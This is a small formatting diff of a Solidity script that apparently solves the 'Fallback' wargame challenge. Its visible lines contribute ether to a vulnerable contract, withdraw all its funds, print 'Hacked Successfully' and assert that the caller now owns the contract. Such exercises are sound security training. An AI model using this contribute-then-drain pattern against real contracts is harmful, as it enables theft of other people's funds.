@@ -24,7 +24,7 @@ contract FallbackScript is Script {
 
         assert(msg.sender != Fallback(payable(FallbackAddress)).owner());
 
-        Fallback(payable(FallbackAddress)).contribute{ value: 0.0001 ether}();
+        Fallback(payable(FallbackAddress)).contribute{value: 0.0001 ether}();
 
         console.log("Contributed 0.0001 ether");
 
@@ -34,7 +34,7 @@ contract FallbackScript is Script {
 
         Fallback(payable(FallbackAddress)).withdraw();
         console.log("Withdrew all ether");
-        
+
         console.log("Hacked Successfully");
 
         assert(msg.sender == Fallback(payable(FallbackAddress)).owner());
